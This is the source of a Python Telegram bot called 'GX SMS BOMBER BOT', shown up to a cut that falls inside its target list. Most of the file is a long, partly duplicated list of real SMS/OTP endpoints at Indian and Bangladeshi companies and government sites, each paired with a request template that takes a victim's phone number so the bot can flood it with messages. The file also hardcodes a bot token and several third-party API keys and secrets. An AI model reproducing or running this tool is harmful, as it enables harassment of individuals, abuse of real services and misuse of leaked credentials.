#!/usr/bin/env python3

#GX SMS BOMBER BOT ; Dev: @The_Dark_Mamun ; main channel: https://t.me/GAJARBOTOLX; main group: https://t.me/gajarbotolxchat; logs channel: https://t.me/GXlogschannel; credit: @The_Dark_Mamun
import asyncio
import aiohttp
from aiogram.types import FSInputFile
import random
import time
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart, Command
from aiogram.client.default import DefaultBotProperties
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# --- [ CONFIGURATION ] ---
BOT_TOKEN = "8856438816:AAFSR9nth0bqHEleMSv0BpkYW3kvhmNdR7E"
DEVELOPER_ID = "@The_Dark_Mamun"  # Developer ID
ADMIN_IDS = [7810637734]  # Add admin user IDs here
OWNER_ID = [7810637734] # Replace with your Owner ID
BOT_ID = [8856438816]  # Add Bot IDs here
BOT_USERNAME = "@GX_BOMBERBOT"
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()
stop_signals = {}
user_attacks = {}
attack_stats = {}

# --- [ ANIMATION FRAMES ] ---
ANIMATION_FRAMES = [
    "🔄 Processing...",
    "⚡ Firing APIs...", 
    "🔥 Bombarding...",
    "💥 Exploding...",
    "🚀 Launching...",
    "🎯 Targeting..."
]

# --- [ ULTIMATE API COLLECTION - FIXED ] ---
ULTIMATE_APIS = [
    # === SMS APIs ===
    {
        "name": "GX api 1",
        "type": "SMS",
        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "GX api 2",
        "type": "SMS",
        "url": lambda phone: f"https://apu-inky.vercel.app/send?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "GX api 3",
        "type": "SMS",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'
    },
    {
        "name": "GX api 4",
        "type": "SMS",
        "url": "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}'
    },
    {
        "name": "GX api 5",
        "type": "SMS", 
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}'
    },
    {
        "name": "GX api 6",
        "type": "SMS",
        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","city":362}}'
    },
    {
        "name": "GX api 7",
        "type": "SMS",
        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","email":"test@example.com"}}'
    },
    {
        "name": "GX api 8",
        "type": "SMS",
        "url": "https://api.myhubble.money/v1/auth/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNumber":"{phone}","channel":"SMS"}}'
    },
    {
        "name": "GX api 9",
        "type": "SMS",
        "url": "https://login.housing.com/api/v2/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country_url_name":"in"}}'
    },
    {
        "name": "GX api 10",
        "type": "SMS",
        "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "GX api 11",
        "type": "SMS",
        "url": "https://api.khatabook.com/v1/auth/request-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"wk+avHrHZf2"}}'
    },
    {
        "name": "GX api 12",
        "type": "SMS",
        "url": "https://animall.in/zap/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}}'
    },
    {
        "name": "GX api 13",
        "type": "SMS",
        "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","version":"1.4.28"}}'
    },
    {
        "name": "GX api 14",
        "type": "SMS",
        "url": "https://jiffy.spencers.in/user/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },

    # --- GET Method APIs ---
    {
        "name": "GX api 15",
        "type": "SMS",
        "url": lambda phone: f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "GX api 16",
        "type": "SMS",
        "url": lambda phone: f"https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{phone}&lang=en&ng=0",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "GX api 17",
        "type": "SMS",
        "url": lambda phone: f"https://auth.shukhee.com/register?mobile=+88{phone}&_rsc=1jwvn",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "GX api 18",
        "type": "SMS",
        "url": lambda phone: f"https://api.medeasy.health/api/send-otp/+88{phone}/",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "GX api 19",
        "type": "SMS",
        "url": lambda phone: f"http://ultranetrn.com.br/fonts/api.php?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "GX api 20",
        "type": "SMS",
        "url": lambda phone: f"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "GX api 21",
        "type": "SMS",
        "url": lambda phone: f"https://ss.binge.buzz/otp/send/login{phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "GX api 22",
        "type": "SMS",
        "url": lambda phone: f"https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88{phone}&platform=app&activity=login",
        "method": "GET",
        "headers": {},
        "data": None
    },

    # --- POST Method APIs ---
    {
        "name": "GX api 23",
        "type": "SMS",
        "url": "https://app.deshal.net/api/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "GX api 24",
        "type": "SMS",
        "url": "https://weblogin.grameenphone.com/backend/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"msisdn":"{phone}"}}'
    },
    {
        "name": "GX api 25",
        "type": "SMS",
        "url": "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","email":"","language":"en"}}'
    },
    {
        "name": "GX api 26",
        "type": "SMS",
        "url": "https://api.busbd.com.bd/api/auth",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"+88{phone}"}}'
    },
    {
        "name": "GX api 27",
        "type": "SMS",
        "url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"full_name":"Apk","email_address":"apkzone2.0@gmail.com","company_name":"Ahgbd","phone_number":"{phone}"}}'
    },
    {
        "name": "GX api 28",
        "type": "SMS",
        "url": "https://api.osudpotro.com/api/v1/users/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"+880{phone}","deviceToken":"web","language":"en","os":"web"}}'
    },
    {
        "name": "GX api 29",
        "type": "SMS",
        "url": "https://api.apex4u.com/api/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'
    },
    {
        "name": "GX api 30",
        "type": "SMS",
        "url": "https://bb-api.bohubrihi.com/public/activity/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","intent":"login"}}'
    },
    {
        "name": "GX api 31",
        "type": "SMS",
        "url": "https://fundesh.com.bd/api/auth/generateOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"msisdn":"{phone}"}}'
    },
    {
        "name": "GX api 32",
        "type": "SMS",
        "url": "https://user-api.jslglobal.co/v2/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"+88{phone}","jatri_token":"J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"}}'
    },
    {
        "name": "GX api 33",
        "type": "SMS",
        "url": "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"+88{phone}"}}'
    },
    {
        "name": "GX api 34",
        "type": "SMS",
        "url": "https://apix.rabbitholebd.com/appv2/login/requestOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"+88{phone}"}}'
    },
    {
        "name": "GX api 35",
        "type": "SMS",
        "url": "https://auth.qcoom.com/api/v1/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNumber":"+88{phone}"}}'
    },
    {
        "name": "GX api 36",
        "type": "SMS",
        "url": "https://api.garibookadmin.com/api/v4/user/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"+880{phone}","recaptcha_token":"garibookcaptcha","channel":"web"}}'
    },
    {
        "name": "GX api 37",
        "type": "SMS",
        "url": "https://training.gov.bd/backoffice/api/user/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "GX api 38",
        "type": "SMS",
        "url": "https://api.shikho.com/public/activity/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","intent":"ap-discount-request"}}'
    },
    {
        "name": "GX api 39",
        "type": "SMS",
        "url": "https://core.easy.com.bd/api/v1/registration",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"name":"Tusar","email":"apkzone2.0info@gmail.com","mobile":"{phone}","password":"amitusar","password_confirmation":"amitusar","device_key":"b2c8ddd3be..."}}'
    },
    {
        "name": "GX api 40",
        "type": "SMS",
        "url": "https://da-api.robi.com.bd/da-nll/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"msisdn":"{phone}"}}'
    },
    {
        "name": "GX api 41",
        "type": "SMS",
        "url": "https://prod-api.viewlift.com/identity/signup?site=hoichoitv",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNumber":"{phone}","requestType":"send","emailConsent":true,"whatsappConsent":true}}'
    },
    {
        "name": "GX api 42",
        "type": "SMS",
        "url": "https://app.addatimes.com/api/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country_code":"BD"}}'
    },
    {
        "name": "GX api 43",
        "type": "SMS",
        "url": "https://regalfurniturebd.com/api/auth/otp-generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","verification_code":""}}'
    },
    {
        "name": "GX api 44",
        "type": "SMS",
        "url": "https://regalfurniturebd.com/api/auth/register",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"name":"User","email":"user@example.com","phone":"{phone}","password":"password123"}}'
    },
    {
        "name": "GX api 45",
        "type": "SMS",
        "url": "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"email":"apkzone2.0@gmail.com","phone_number":"88{phone}"}}'
    },
    {
        "name": "GX api 46",
        "type": "SMS",
        "url": "https://backend.timezonebd.com/api/v1/user/otp-request",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "GX api 47",
        "type": "SMS",
        "url": "https://backend.timezonebd.com/api/v1/user/regnewcustomer",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"name":"Tusar","email":"fukc@gmail.com","phone":"{phone}","password":"aAeMY@5hG8iUfD4","password_confirmation":"aAeMY@5hG8iUfD4"}}'
    },
    {
        "name": "GX api 48",
        "type": "SMS",
        "url": "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"device_uuid":"...","firebase_token":"...","geo_location":"...","mno":"Grameenphone","wallet_number":"{phone}"}}'
    },
    {
        "name": "GX api 49",
        "type": "SMS",
        "url": "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"number":"+880{phone}"}}'
    },
    {
        "name": "GX api 50",
        "type": "SMS",
        "url": "https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=148.0.7778.178&os=Android&osv=12",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"mobile={phone}&fcmToken=&referral="
    },
    {
        "name": "GX api 51",
        "type": "SMS",
        "url": "https://www.pkluck2.com/wps/verification/sms/noLogin",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNum":"{phone}","countryDialingCode":"880"}}'
    },
    {
        "name": "GX api 52",
        "type": "SMS",
        "url": "https://applink.com.bd/appstore-v4-server/login/otp/request",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"msisdn":"880{phone}"}}'
    },
    {
        "name": "GX api 53",
        "type": "SMS",
        "url": "https://newprod.api-care-box.click:444/api/user/register/?version=otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"Name":"Abdullah Al Mamun","Phone":"+880{phone}"}}'
    },
    {
        "name": "GX api 54",
        "type": "SMS",
        "url": "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_no":"{phone}"}}'
    },
    {
        "name": "GX api 55",
        "type": "SMS",
        "url": "https://www.jayabajibd.life/api/register/confirm",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileno":"{phone}","username":"abffjddngf864","firstname":"","new_password":"tPNVOcen!6XEz3b","confirm_new_password":"tPNVOcen!6XEz3b","country_code":"880","country":"BD","currency":"BDT","ref":"","language":"en"}}'
    },
    {
        "name": "GX api 56",
        "type": "SMS",
        "url": "https://api.swap.com.bd/api/v1/send-otp/v2",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "GX api 57",
        "type": "SMS",
        "url": "https://apiv1.bdtickets.com/api/v1/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"+880{phone}"}}'
    },
    {
        "name": "GX api 58",
        "type": "SMS",
        "url": "https://ss.binge.buzz/otp/send/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "GX api 59",
        "type": "SMS",
        "url": "https://sendmysms.net/send-otp.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phonenumber={phone}"
    },
    {
        "name": "GX api 60",
        "type": "SMS",
        "url": "https://api.shikho.com/auth/v2/send/sms",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"auth_type":"login","phone":"{phone}","vendor":"shikho","type":"student"}}'
    },
    {
        "name": "GX api 61",
        "type": "SMS",
        "url": "https://app.eonbazar.com/api/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"method":"otp","mobile":"{phone}"}}'
    },
    {
        "name": "GX api 62",
        "type": "SMS",
        "url": "http://nesco.sslwireless.com/api/v1/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone_number":"{phone}"}}'
    },
    {
        "name": "GX api 63",
        "type": "SMS",
        "url": "https://developer.quizgiri.xyz/api/v2.0/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"country_code":"+880","phone":"{phone}"}}'
    },
    {
        "name": "GX api 64",
        "type": "SMS",
        "url": "https://www.bazar365.store/api/v1/auth/sendPhoneOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","applicationChannel":"WEB_APP"}}'
    },
    {
        "name": "GX api 65",
        "type": "SMS",
        "url": "https://www.bioscopelive.com/en/login/send-otp?phone=880{phone}&operator=bd-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","applicationChannel":"WEB_APP"}}'
    },
    {
        "name": "Service_Gateway_A",
        "type": "SMS",
        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Service_Gateway_B",
        "type": "SMS",
        "url": lambda phone: f"https://apu-inky.vercel.app/send?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Service_Gateway_C",
        "type": "SMS",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'
    },
    {
        "name": "Service_Gateway_D",
        "type": "SMS",
        "url": "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}'
    },
    {
        "name": "Service_Gateway_E",
        "type": "SMS", 
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}'
    },
    {
        "name": "Service_Gateway_F",
        "type": "SMS",
        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","city":362}}'
    },
    {
        "name": "Service_Gateway_G",
        "type": "SMS",
        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","email":"test@example.com"}}'
    },
    {
        "name": "Service_Gateway_H",
        "type": "SMS",
        "url": "https://api.myhubble.money/v1/auth/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNumber":"{phone}","channel":"SMS"}}'
    },
    {
        "name": "Service_Gateway_I",
        "type": "SMS",
        "url": "https://login.housing.com/api/v2/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country_url_name":"in"}}'
    },
    {
        "name": "Service_Gateway_J",
        "type": "SMS",
        "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Service_Gateway_K",
        "type": "SMS",
        "url": "https://api.khatabook.com/v1/auth/request-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"wk+avHrHZf2"}}'
    },
    {
        "name": "Service_Gateway_L",
        "type": "SMS",
        "url": "https://animall.in/zap/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}}'
    },
    {
        "name": "Service_Gateway_M",
        "type": "SMS",
        "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","version":"1.4.28"}}'
    },
    {
        "name": "Service_Gateway_N",
        "type": "SMS",
        "url": "https://jiffy.spencers.in/user/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },

    # --- GET Method APIs ---
    {
        "name": "Service_Gateway_O",
        "type": "SMS",
        "url": lambda phone: f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Service_Gateway_P",
        "type": "SMS",
        "url": lambda phone: f"https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{phone}&lang=en&ng=0",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Service_Gateway_Q",
        "type": "SMS",
        "url": lambda phone: f"https://auth.shukhee.com/register?mobile=+88{phone}&_rsc=1jwvn",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Service_Gateway_R",
        "type": "SMS",
        "url": lambda phone: f"https://api.medeasy.health/api/send-otp/+88{phone}/",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Service_Gateway_S",
        "type": "SMS",
        "url": lambda phone: f"http://ultranetrn.com.br/fonts/api.php?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Service_Gateway_T",
        "type": "SMS",
        "url": lambda phone: f"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Service_Gateway_U",
        "type": "SMS",
        "url": lambda phone: f"https://ss.binge.buzz/otp/send/login{phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Service_Gateway_V",
        "type": "SMS",
        "url": lambda phone: f"https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88{phone}&platform=app&activity=login",
        "method": "GET",
        "headers": {},
        "data": None
    },

    # --- POST Method APIs ---
    {
        "name": "Service_Gateway_W",
        "type": "SMS",
        "url": "https://app.deshal.net/api/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Service_Gateway_X",
        "type": "SMS",
        "url": "https://weblogin.grameenphone.com/backend/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"msisdn":"{phone}"}}'
    },
    {
        "name": "Service_Gateway_Y",
        "type": "SMS",
        "url": "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","email":"","language":"en"}}'
    },
    {
        "name": "Service_Gateway_Z",
        "type": "SMS",
        "url": "https://api.busbd.com.bd/api/auth",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"+88{phone}"}}'
    },
    {
        "name": "Auth_Server_01",
        "type": "SMS",
        "url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"full_name":"Apk","email_address":"apkzone2.0@gmail.com","company_name":"Ahgbd","phone_number":"{phone}"}}'
    },
    {
        "name": "Auth_Server_02",
        "type": "SMS",
        "url": "https://api.osudpotro.com/api/v1/users/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"+880{phone}","deviceToken":"web","language":"en","os":"web"}}'
    },
    {
        "name": "Auth_Server_03",
        "type": "SMS",
        "url": "https://api.apex4u.com/api/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'
    },
    {
        "name": "Auth_Server_04",
        "type": "SMS",
        "url": "https://bb-api.bohubrihi.com/public/activity/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","intent":"login"}}'
    },
    {
        "name": "Auth_Server_05",
        "type": "SMS",
        "url": "https://fundesh.com.bd/api/auth/generateOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"msisdn":"{phone}"}}'
    },
    {
        "name": "Auth_Server_06",
        "type": "SMS",
        "url": "https://user-api.jslglobal.co/v2/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"+88{phone}","jatri_token":"J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"}}'
    },
    {
        "name": "Auth_Server_07",
        "type": "SMS",
        "url": "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"+88{phone}"}}'
    },
    {
        "name": "Auth_Server_08",
        "type": "SMS",
        "url": "https://apix.rabbitholebd.com/appv2/login/requestOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"+88{phone}"}}'
    },
    {
        "name": "Auth_Server_09",
        "type": "SMS",
        "url": "https://auth.qcoom.com/api/v1/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNumber":"+88{phone}"}}'
    },
    {
        "name": "Auth_Server_10",
        "type": "SMS",
        "url": "https://api.garibookadmin.com/api/v4/user/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"+880{phone}","recaptcha_token":"garibookcaptcha","channel":"web"}}'
    },
    {
        "name": "Auth_Server_11",
        "type": "SMS",
        "url": "https://training.gov.bd/backoffice/api/user/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Auth_Server_12",
        "type": "SMS",
        "url": "https://api.shikho.com/public/activity/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","intent":"ap-discount-request"}}'
    },
    {
        "name": "Auth_Server_13",
        "type": "SMS",
        "url": "https://core.easy.com.bd/api/v1/registration",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"name":"Tusar","email":"apkzone2.0info@gmail.com","mobile":"{phone}","password":"amitusar","password_confirmation":"amitusar","device_key":"b2c8ddd3be..."}}'
    },
    {
        "name": "Auth_Server_14",
        "type": "SMS",
        "url": "https://da-api.robi.com.bd/da-nll/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"msisdn":"{phone}"}}'
    },
    {
        "name": "Auth_Server_15",
        "type": "SMS",
        "url": "https://prod-api.viewlift.com/identity/signup?site=hoichoitv",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNumber":"{phone}","requestType":"send","emailConsent":true,"whatsappConsent":true}}'
    },
    {
        "name": "Auth_Server_16",
        "type": "SMS",
        "url": "https://app.addatimes.com/api/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country_code":"BD"}}'
    },
    {
        "name": "Auth_Server_17",
        "type": "SMS",
        "url": "https://regalfurniturebd.com/api/auth/otp-generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","verification_code":""}}'
    },
    {
        "name": "Auth_Server_18",
        "type": "SMS",
        "url": "https://regalfurniturebd.com/api/auth/register",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"name":"User","email":"user@example.com","phone":"{phone}","password":"password123"}}'
    },
    {
        "name": "Auth_Server_19",
        "type": "SMS",
        "url": "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"email":"apkzone2.0@gmail.com","phone_number":"88{phone}"}}'
    },
    {
        "name": "Auth_Server_20",
        "type": "SMS",
        "url": "https://backend.timezonebd.com/api/v1/user/otp-request",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
